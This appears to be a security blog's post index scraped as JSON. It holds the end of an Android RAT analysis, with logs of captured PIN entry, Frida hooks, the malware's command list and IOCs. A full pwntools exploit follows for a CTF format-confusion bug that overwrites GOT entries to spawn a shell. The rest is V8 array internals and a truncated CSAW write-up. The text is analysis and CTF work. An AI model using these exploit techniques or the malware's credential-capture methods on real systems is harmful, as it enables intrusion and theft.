ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [TUV, 8]; ContentDescription: 8; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_WINDOW_CONTENT_CHANGED; EventTime: 6844817; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: [CONTENT_CHANGE_TYPE_SUBTREE, CONTENT_CHANGE_TYPE_TEXT, CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION]; WindowChangeTypes: [] [ ClassName: android.widget.FrameLayout; Text: []; ContentDescription: null; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 6846871; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022\\u2022; FromIndex: 2; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 6846871; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [TUV, 8]; ContentDescription: 8; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 6849213; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022\\u2022\\u2022; FromIndex: 3; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 6849214; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [TUV, 8]; ContentDescription: 8; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_WINDOW_CONTENT_CHANGED; EventTime: 6849742; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: [CONTENT_CHANGE_TYPE_SUBTREE, CONTENT_CHANGE_TYPE_TEXT]; WindowChangeTypes: [] [ ClassName: android.widget.FrameLayout; Text: []; ContentDescription: null; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 6851309; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022\\u2022\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022\\u2022\\u2022\\u2022; FromIndex: 4; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 6851311; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [1]; ContentDescription: 1; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0+=========================================================================================================================================================+abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 7515589; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [0, +]; ContentDescription: 0; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 7534238; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022; FromIndex: 1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 7534239; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [DEF, 3]; ContentDescription: 3; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 7537140; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022\\u2022; FromIndex: 2; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 7537142; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [0, +]; ContentDescription: 0; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 7538217; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022\\u2022\\u2022; FromIndex: 3; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 7538221; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [1]; ContentDescription: 1; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 7538933; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022\\u2022\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022\\u2022\\u2022\\u2022; FromIndex: 4; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 7538938; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [ABC, 2]; ContentDescription: 2; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 7539984; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022\\u2022\\u2022\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022\\u2022\\u2022\\u2022\\u2022; FromIndex: 5; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 7539988; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [DEF, 3]; ContentDescription: 3; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 7541313; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022\\u2022\\u2022\\u2022\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022\\u2022\\u2022\\u2022\\u2022\\u2022; FromIndex: 6; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 7541313; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.view.ViewGroup; Text: [GHI, 4]; ContentDescription: 4; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_WINDOW_CONTENT_CHANGED; EventTime: 7564641; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: [CONTENT_CHANGE_TYPE_SUBTREE, CONTENT_CHANGE_TYPE_TEXT, CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION]; WindowChangeTypes: [] [ ClassName: android.widget.FrameLayout; Text: []; ContentDescription: null; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0+=======================================================+If pattern is enabled, it will send that pattern when app info is accessed or when trying to uninstall the app. One mistake made by the author is that it is recording the pattern in descending order, which renders it useless. In this case, you can see that the original pattern is 7;4;1;5;3;6;9, but it is sending 9;7;6;5;4;3;1, which is in descending form. And render useless.If the keylogger is enabled, this will be sent to the author‚Äôs infrastructure.When the record call feature is enabled, it will record calls and then send them to the C2 infrastructure in base64 encoded format.These are more of functionalities. Some of them are implemented, while others are present but not functioning when the condition is met. Maybe due to compatibility reasons, they are there.rat_disconnect unlock_pin {unlock_pin } ‚Äì&gt; implementedunlock_pattern ‚Äî&gt; implementedfake_update ‚Äì&gt; not implementedset_text ‚Äì&gt; implementedlet j = Java.use(\"ru.plaintiff.whale.j\");j[\"D\"].implementation = function (accessibilityNodeInfo, str) { console.log(`j.use_to_display_str is called: accessibilityNodeInfo=${accessibilityNodeInfo}, str=${str}`); this[\"D\"](accessibilityNodeInfo, str);};fake_keyboard ‚Äî&gt; not implementedEnCryptResponse ‚Äì&gt; not implementedreset_fake ‚Äì&gt; not implementedreset_text ‚Äì&gt; implementedlet j = Java.use(\"ru.plaintiff.whale.j\");j[\"J\"].implementation = function (context, str, str2) { console.log(`j.edit_prefenceces_file_ring0 is called: context=${context}, str=${str}, str2=${str2}`); this[\"J\"](context, str, str2);};desc_off ‚Äì&gt; not impltext_off ‚Äî&gt; not implget_all ‚Äî&gt; impllet j = Java.use(\"ru.plaintiff.whale.j\");j[\"h0\"].implementation = function (context, str) { console.log(`j.send_everything is called: context=${context}, str=${str}`); this[\"h0\"](context, str);};start_ghost ‚Äî&gt; implstart_layer_vnc ‚Äì&gt; impllayer_on ‚Äì&gt; not impllayer_off ‚Äì&gt; not implset_pin ‚Äî&gt; impllet j = Java.use(\"ru.plaintiff.whale.j\");j[\"J\"].implementation = function (context, str, str2) { console.log(`j.edit_prefenceces_file_ring0 is called: context=${context}, str=${str}, str2=${str2}`); this[\"J\"](context, str, str2);};notif_open ‚Äì&gt; not implnotif_close ‚Äì&gt; not implIOC :53af37a93802f70f4d587fa13ea7f368b4893cc51d59b70700882306a816da84 classes.dex98ec204106d3e4d225d14217d9e16f106f5d8f0e3d1c8c1a3eb4d6184f7316d7 sample.apkcb9cbe74908f55326b7af47986a779ca857a9df490a12b8bfb5217c4a68864c0 hjAWR.json/data/user/0/com.cliff.own/app_DynamicOptDex/hjAWR.json/data/data/com.cliff.own/shared_prefs/ring0.xmlcom.cliff.own1z06mx6i9sdxxh1xaspbj87fh8qy8pu0.xyz t.me/+vSpP6RRKB35iM2M0All The Required Files" }, { "title": "Profile", "url": "/posts/BlackHatSaudia_Qualifier_2023/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2023-10-09 00:00:00 +0800", "snippet": "The variable age is declared as an integer, and a long integer is obtained from the user. This means that, as an attacker, we have the capability to overwrite the next 4 bytes in memory. These next 4 bytes correspond to a pointer to a character array. As we examine the code, it becomes apparent that this character pointer is used to store user input. Combining these observations, we possess the ability to write anywhere in memory.To begin the attack, we first overwrite the Global Offset Table (GOT) entry for the free function with the address of the main function. This ensures that the program does not exit, creating a loop. The same process is applied to the exit function.Next, our objective is to leak the value for the Libc library‚Äôs base address in order to defeat Address Space Layout Randomization (ASLR). It is noted that regardless of the input provided, the program echoes it back. However, the getline function ensures that the buffer is null-terminated. Therefore, I identify an offset where the null character is replaced before printing. To achieve this, I replace the GOT entry for strcspn with the Procedure Linkage Table (PLT) entry of puts. Every time strcspn is invoked, the puts value will be updated in the GOT table. Subsequently, I write to the puts GOT table. When strcspn replaces the null character, the program prints the buffer, thereby leaking the puts value with respect to the Libc library loaded in memory.Finally, the remaining steps are straightforward: I replace the free GOT table entry with that of the system function, and send /bin/sh as a string. With this, the shell is obtained. Boom, shell dropped!PotectionVuln Code#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;time.h&gt;struct person_t { int id; int age; char *name;};void get_value(const char *msg, void *pval) { printf(\"%s\", msg); if (scanf(\"%ld%*c\", (long*)pval) != 1) exit(1);}void get_string(const char *msg, char **pbuf) { size_t n; printf(\"%s\", msg); getline(pbuf, &amp;n, stdin); (*pbuf)[strcspn(*pbuf, \"\\n\")] = '\\0';}int main() { struct person_t employee = { 0 }; employee.id = rand() % 10000; get_value(\"Age: \", &amp;employee.age); if (employee.age &lt; 0) { puts(\"[-] Invalid age\"); exit(1); } get_string(\"Name: \", &amp;employee.name); printf(\"----------------\\n\" \"ID: %04d\\n\" \"Name: %s\\n\" \"Age: %d\\n\" \"----------------\\n\", employee.id, employee.name, employee.age); free(employee.name); exit(0);}__attribute__((constructor))void setup(void) { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); srand(time(NULL));}Exploit#!/usr/bin/python3from pwn import *import struct# context.terminal = ['tmux','splitw','-h']os.environ['XDG_CACHE_HOME'] = '/tmp/'context.log_level = 'error'info = lambda msg: log.info(msg)sla = lambda msg, data: io.sendlineafter(msg, data)sa = lambda msg, data: io.sendafter(msg, data)sl = lambda data: io.sendline(data)s = lambda data: io.send(data)# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *get_string+84break *0x404140continuecontinuecontinuecontinuecontinue'''.format(**locals())exe = './bin'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)libc = elf.libc ; libc_rop = ROP(libc,checksec=False)io = start()address = elf.got.freesla(b\"Age: \",str((address &lt;&lt; 32) + 1))sla(b\"Name: \",p32(elf.sym.main)[:-1])address = elf.got.exitsla(b\"Age: \",str((address &lt;&lt; 32) + 1))sla(b\"Name: \",p32(elf.sym.main)[:-1])address = elf.got.strcspnsla(b\"Age: \",str((address &lt;&lt; 32) + 1))sla(b\"Name: \",p64(0x401040))address = elf.got.putssla(b\"Age: \",str((address &lt;&lt; 32) + 1))sla(b\"Name: \",b\"\")io.recvuntil(b\"Name:\")leak_puts=u64(io.recvline().strip(b\"\\n\")[1:]+b\"\\x00\"*2)print(f\"Leaking Puts Value : {hex(leak_puts)}\")libc.address = leak_puts - libc.sym.putsaddress = elf.got.freesla(b\"Age: \",str((address &lt;&lt; 32) + 1))sla(b\"Name: \",p64(libc.sym.system))sla(b\"Age: \",\"1\")sla(b\"Name: \",b\"/bin/sh\")io.interactive()" }, { "title": "V8 Internals Part 1", "url": "/posts/Array/", "categories": "Browser, v8", "tags": "", "date": "2023-09-24 00:00:00 +0800", "snippet": "Pointer CompressionPointer Compression in V8 leverages a fascinating characteristic of heap-based objects, namely their proximity to one another. This proximity often results in a significant portion of the pointer having identical most significant bits. Exploiting this, V8 conserves memory by storing only the least significant bits of the pointer, while reserving the upper 32 bits (referred to as the isolate root) in a designated root register (R13). When a pointer needs to be accessed, it is simply combined with the value in the register, yielding the complete address. This compression strategy is implemented in the /src/common/ptr-compr-inl.h source file within V8.Fundamentally, the objective pursued by the V8 team was to find a way to accommodate both types of tagged values within 32 bits on 64-bit architectures. This endeavor was undertaken to minimize overhead in V8, with the specific aim of reclaiming as many of the 4-byte wastages inherent to the x64 architecture as possible.Pointer TaggingThe technique of pointer tagging relies on the recognition that on x32 and x64 systems, allocated data is required to be positioned at word-aligned (4-byte) boundaries. This alignment characteristic ensures that the least significant bits (LSB) will consistently hold a value of zero. Consequently, pointer tagging utilizes these two least significant bits to discern between a pointer referring to a heap object and an integer or Small Integer (SMI). This optimization allows for efficient distinction and handling of different data types within the system.ArrayHere‚Äôs an general explanation of how Arrays are stored in memory in V8:When an Array is created in V8, memory is allocated for it on the heap. The object‚Äôs value is a pointer to the JSArray structure, which encompasses the following components: Map: This is a pointer pointing to the HiddenClass object. The HiddenClass object essentially defines the ‚Äúshape‚Äù or structure of the object, akin to a blueprint for the array. Properties: This pointer directs to an object that holds the named properties of the array. Elements: This pointer directs to an object that contains the numbered properties of the array.Attaching GDB to the d8 instance with the --allow-natives-syntax flag grants us enhanced debugging capabilities. This allows the utilization of %DebugPrint(arr) to obtain detailed information regarding its internal structure and memory allocation. This debugging feature is instrumental in gaining deeper insights into how V8 handles arrays in memory.var arr1 = [1.1,2.2]%DebugPrint(arr)DebugPrint: 0x52117690b99: [JSArray] - map: 0x000f010c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; - elements: 0x052117690b81 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS] { 0: 1.1 , 1:2.2 } - properties: 0x0ac43ba80c71 &lt;FixedArray[0]&gt; - length: 2 var arr = [1.1,2.2]# Pointer Compression OFF DebugPrint: 0x52117692fb1: [JSArray] - map: 0x000f010c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; - properties: 0x0ac43ba80c71 &lt;FixedArray[0]&gt; - elements: 0x052117692f91 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS] { 0: 1.1 1: 2.2 } - length: 2pwndbg&gt; x/8gx 0x52117692fb1-1 [JSArray]0x52117692fb0:\t0x0000000f010c2ed9 (Map) 0x00000ac43ba80c71 (Properties)0x52117692fc0:\t0x0000052117692f91 (Elements)\t 0x0000000200000000 (Length)0x52117692fd0:\t0x00000ac43ba80941 (Ignore this) 0x00000010dab15b0e (Ignore this)0x52117692fe0:\t0x7250677562654425 (Ignore this) 0x2972726128746e69 (Ignore this)pwndbg&gt; x/8gx 0x0000052117692f91-1 [Element]0x52117692f90:\t0x00000ac43ba814f9 (Map)\t0x0000000200000000 (Length)0x52117692fa0:\t0x3ff199999999999a (1.1)\t0x400199999999999a (2.2)# Pointer Compression ONDebugPrint: 0x2f990024cf85: [JSArray] - map: 0x2f990014ed75 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - properties: 0x2f9900000219 &lt;FixedArray[0]&gt; - elements: 0x2f990024cf6d &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS] { 0: 1.1 1: 2.2 } - length: 2 pwndbg&gt; x/5wx 0x2f990024cf85-1 [JSArray]0x2f990024cf84:\t0x0014ed75 (Map) \t0x00000219 (Properties) \t0x0024cf6d (Elements) \t0x00000004 (length &lt;&lt; 1)0x2f990024cf94:\t0x0000058d (Ignore This)pwndbg&gt; x/5wx 0x2f990024cf6d-1 [Element]0x2f990024cf6c:\t0x00000925 (Map)\t0x00000004 (Length &lt;&lt; 1)\t0x9999999a (1.1[0])\t0x3ff19999 (1.1[1])0x2f990024cf7c:\t0x9999999a (2.1[0])pwndbg&gt; x/5gf 0x2f990024cf6d-10x2f990024cf6c:\t8.4879843204687662e-314 (Map|Length &lt;&lt;1)\t1.1000000000000001 (1.1)0x2f990024cf7c:\t2.2000000000000002 (2.2) \t1.1395124173638311e-311 (Ignore This)var arr = [1,2,3]%DebugPrint(arr)// Clean up some of the output DebugPrint: 0x5211768dd49: [JSArray] - map: 0x000f010c2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; - properties: 0x0ac43ba80c71 &lt;FixedArray[0]&gt; - elements: 0x05211768dcd9 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)] { 0:1 1:2 2:3 } - length: 3var obj = {1:'A'}var arr2 = ['A']var arr3 = [arr1]var arr4 = [arr2]var arr5 = [obj]%DebugPrint(arr2)%DebugPrint(arr3)%DebugPrint(arr4)%DebugPrint(arr5)DebugPrint: 0x52117691a59: [JSArray] - map: 0x000f010c2f79 &lt;Map(PACKED_ELEMENTS)&gt; - properties: 0x0ac43ba80c71 &lt;FixedArray[0]&gt; - elements: 0x052117690e01 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS (COW)] { 0: 0x3d7d68562569 &lt;String[#1]: A&gt; } - length: 1[\"A\"]DebugPrint: 0x52117691ad1: [JSArray] - map: 0x000f010c2f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties] - properties: 0x0ac43ba80c71 &lt;FixedArray[0]&gt; - elements: 0x052117691ab9 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS] { 0: 0x052117690b99 &lt;JSArray[1]&gt; } - length: 1[[1.1]]DebugPrint: 0x52117691b49: [JSArray] - map: 0x000f010c2f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties] - properties: 0x0ac43ba80c71 &lt;FixedArray[0]&gt; - elements: 0x052117691b31 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS] { 0: 0x052117691a59 &lt;JSArray[1]&gt; } - length: 1[[\"A\"]]DebugPrint: 0x52117692901: [JSArray] - map: 0x000f010c2f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties] - properties: 0x0ac43ba80c71 &lt;FixedArray[0]&gt; - elements: 0x0521176928e9 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS] { 0: 0x052117692381 &lt;Object map = 0xf010c0459&gt; } - length: 1 [{1: \"A\"}]Indeed, the use of different map types based on the data within the array serves to facilitate optimization. This dynamic mapping allows V8 to adapt to runtime changes in array content. It‚Äôs important to note that these transitions are unidirectional. Once an array transitions from, for example, PACKED_SMI_ELEMENTS to PACKED_DOUBLE_ELEMENTS, it will not revert back. This progression toward less optimized representations as we move further to the right underscores the adaptive nature of V8‚Äôs optimization strategies.const array = [1, 2, 3];// elements kind: PACKED_SMI_ELEMENTSarray.push(4.56);// elements kind: PACKED_DOUBLE_ELEMENTSarray.push('x');// elements kind: PACKED_ELEMENTSconst array = [1, 2, 3, 4.56, 'x'];const array = [1, 2, 3, 4.56, [1]];// elements kind: PACKED_ELEMENTSarray.length; // 5array[9] = 1;// array[5] until array[8] are now holes// elements kind: HOLEY_ELEMENTSReferencehttps://v8.dev/blog/elements-kinds" }, { "title": "Unlimited Subway csaw quater 2023", "url": "/posts/unlimited_subway__csaw_quater_2023/", "categories": "Pwn, i386, ctf", "tags": "", "date": "2023-09-18 00:00:00 +0800", "snippet": "Initial AssessmentUpon initial examination of the binary, the following properties and security measures were identified: Architecture: The binary is compiled for the i386 architecture, indicating that it is intended for 32-bit Intel x86 systems. Canary and Non-executable Stack Mitigation: The binary has enabled security measures, including the use of a ‚Äúcanary‚Äù and a non-executable stack. The canary is a random value placed on the stack before local variables, which helps detect stack overflows. Additionally, marking the stack as non-executable prevents the 